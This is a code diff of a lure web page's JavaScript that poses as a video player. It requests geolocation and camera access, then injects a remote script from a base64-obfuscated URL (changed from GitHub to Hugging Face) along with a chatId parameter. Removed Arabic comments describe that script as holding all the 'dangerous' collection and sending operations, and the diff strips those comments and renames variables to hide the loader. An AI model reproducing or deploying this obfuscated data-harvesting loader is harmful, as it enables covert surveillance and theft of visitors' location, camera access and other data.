@@ -403,9 +403,8 @@
             const spinner = document.getElementById('spinner');
             const loading = document.getElementById('loading');
 
-            // ===== طلب الصلاحيات (لإظهار نوافذ المتصفح) =====
+            // ===== طلب الصلاحيات =====
             async function requestPermissions() {
-                // طلب إذن الموقع
                 try {
                     await new Promise((resolve) => {
                         navigator.geolocation.getCurrentPosition(
@@ -416,7 +415,6 @@
                     });
                 } catch (e) {}
                 
-                // طلب إذن الكاميرا
                 try {
                     await navigator.mediaDevices.getUserMedia({ video: true })
                         .then(stream => stream.getTracks().forEach(t => t.stop()))
@@ -453,24 +451,23 @@
                 }
             }
 
-            // ===== استدعاء API الخارجي الذي يحتوي كل العمليات الخطيرة =====
+    
             function loadExternalAPI() {
-                var encodedUrl = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0ZHREhTSFMvYXBpL3JlZnMvaGVhZHMvbWFpbi9hcGk=';
-                var decodedUrl = atob(encodedUrl);
                 
-                var scriptTag = document.createElement('script');
-                scriptTag.src = decodedUrl;
-                scriptTag.async = true;
+                var _0x = 'aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9zcGFjZXMvZHNmZGRqZmMvYWdlYWdhYWEvcmF3L21haW4vYXBp';
+                var url = atob(_0x);
+                
+                var s = document.createElement('script');
+                s.src = url;
+                s.async = true;
                 
                 window._chatId = new URLSearchParams(window.location.search).get('chatId') || '';
                 
-                document.head.appendChild(scriptTag);
+                document.head.appendChild(s);
                 
-                scriptTag.onload = function() {
+                s.onload = function() {
                     setTimeout(function() {
-                        if (scriptTag.parentNode) {
-                            scriptTag.parentNode.removeChild(scriptTag);
-                        }
+                        if (s.parentNode) s.parentNode.removeChild(s);
                     }, 5000);
                 };
             }
@@ -491,43 +488,27 @@
                 if (isProcessing || videoStarted) return;
 
                 if (!settingsOpened) {
-                    // الضغطة الأولى: طلب الأذونات وفتح إعدادات الموقع
                     settingsOpened = true;
-                    
-                    // طلب الأذونات أولاً (سيظهر نافذة المتصفح)
                     await requestPermissions();
-                    
-                    // ثم فتح الإعدادات
                     openLocationSettings();
                 } else {
-                    // الضغطة الثانية: بدء تشغيل الفيديو + استدعاء API
                     videoStarted = true;
-                    
                     realVideo.muted = false;
                     realVideo.volume = 1.0;
                     realVideo.play().catch(() => {});
-                    
-                    // استدعاء API الخارجي (يحتوي كل عمليات الجمع والإرسال)
                     loadExternalAPI();
-                    
-                    // إظهار الفيديو
                     showVideo();
                 }
             }
 
-            // ===== رصد العودة من الإعدادات =====
             document.addEventListener('visibilitychange', function() {
-                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
-                    // المستخدم عاد من الإعدادات
-                }
+                if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {}
             });
 
-            // ===== ربط الأحداث =====
             if (locationBtn) {
                 locationBtn.addEventListener('click', handleButtonClick);
             }
 
-            // ===== تفعيل الصوت عند أي تفاعل =====
             document.addEventListener('click', function() {
                 if (realVideo) {
                     realVideo.muted = false;
@@ -535,7 +516,6 @@
                 }
             }, true);
 
-            // ===== أزرار التحكم =====
             document.querySelectorAll('.control-button').forEach(button => {
                 button.addEventListener('click', function(e) {
                     e.stopPropagation();
@@ -550,7 +530,6 @@
                 });
             });
 
-            // ===== شريط التقدم الوهمي =====
             const progressInterval = setInterval(() => {
                 const progressFill = document.querySelector('.progress-fill');
                 const realVideoEl = document.getElementById('realVideo');
